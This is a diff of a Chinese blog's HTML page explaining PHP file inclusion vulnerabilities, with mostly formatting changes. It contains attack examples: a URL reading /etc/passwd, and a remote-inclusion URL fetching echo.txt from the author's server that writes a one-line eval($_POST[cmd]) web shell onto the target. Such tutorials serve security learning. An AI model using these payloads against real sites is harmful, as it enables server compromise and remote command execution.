@@ -6,11 +6,10 @@
     <meta charset="utf-8">
     <meta name="keywords" content="文件包含漏洞介绍, 白芨的小屋">
     <meta name="description" content="文件包含原理​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。
-文件包含函数-PHP
 
+注：其他语言也可能出现包含漏洞
 
-php函数：
-解析：">
+文件包含函">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -460,7 +459,7 @@ php函数：
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.3k
                 </div>
                 
 
@@ -480,7 +479,10 @@ php函数：
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。<!--注：其他语言也可能出现包含漏洞--></p>
+                <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>​    大多数web语言（php、java等）可以提供文件包含的操作，以php为例：服务器执行php文件时，可以通过文件包含函数加载另一个文件中的php代码，并且当php来执行。</p>
+<ul>
+<li><strong>注：其他语言也可能出现包含漏洞</strong></li>
+</ul>
 <h2 id="文件包含函数-PHP"><a href="#文件包含函数-PHP" class="headerlink" title="文件包含函数-PHP"></a>文件包含函数-PHP</h2><table>
 <thead>
 <tr>
@@ -531,21 +533,24 @@ allow_url_include <span class="token operator">=</span> <span class="token funct
 <li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li>
 <li>用户能够控制该动态变量。</li>
 </ol>
-<h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><!--目标主机文件存在，且有相应权限--></p>
+<h3 id="1、读取敏感文件"><a href="#1、读取敏感文件" class="headerlink" title="1、读取敏感文件"></a>1、读取敏感文件</h3><p><code>http://www.xxx.com/index.php?filname=/etc/passwd</code><em><strong>目标主机文件存在，且有相应权限</strong></em></p>
 <h3 id="2、远程包含shell"><a href="#2、远程包含shell" class="headerlink" title="2、远程包含shell"></a>2、远程包含shell</h3><p>若<code>allow_url_fopen=on</code>，可尝试远程包含一句话木马。</p>
 <p>示例：</p>
 <p>个人服务器地址:<strong><a target="_blank" rel="noopener" href="http://twowards.top/">http://twowards.top</a></strong></p>
 <p>在网站根目录准备<strong>echo.txt</strong>文件代码如下：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fputs(fopen("shell.php","w"),"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>")</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<!--代码解析：-->
-<!--fputs(要写入的打开文件,写入的字符串内容)-->
-<!--fopen(规定要打开的文件，访问此文件的类型，此处为写入w)-->
-
+<ul>
+<li><p>代码解析：</p>
+</li>
+<li><p>fputs(要写入的打开文件,写入的字符串内容)</p>
+</li>
+<li><p>fopen(规定要打开的文件，访问此文件的类型，此处为写入w)</p>
+</li>
+</ul>
 <p>访问<code>http://www.xxx.com/index.php?filname=http://twowards.top/echo.txt</code>，将会在index.php所在目录生成木马文件shell.php<code>&lt;?php eval($_POST[cmd]);?&gt;</code></p>
 <h3 id="3、本地包含配合文件上传"><a href="#3、本地包含配合文件上传" class="headerlink" title="3、本地包含配合文件上传"></a>3、本地包含配合文件上传</h3><p>若网站提供文件上传功能，通过文件上传上传木马到服务器后使用本地文件包含进行利用。</p>
-<!--直接利用文件上传访问木马可能会无法解析，所以要配合文件包含漏洞。-->
-
+<p><em><strong>直接利用文件上传访问木马可能会无法解析，所以要配合文件包含漏洞。</strong></em></p>
 <h3 id="4、php伪协议"><a href="#4、php伪协议" class="headerlink" title="4、php伪协议"></a>4、php伪协议</h3><p>以参数为filename示例：</p>
 <table>
 <thead>
@@ -1314,7 +1319,7 @@ allow_url_include <span class="token operator">=</span> <span class="token funct
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">15.7k</span>
+                        class="white-color">17.6k</span>
             
             
             
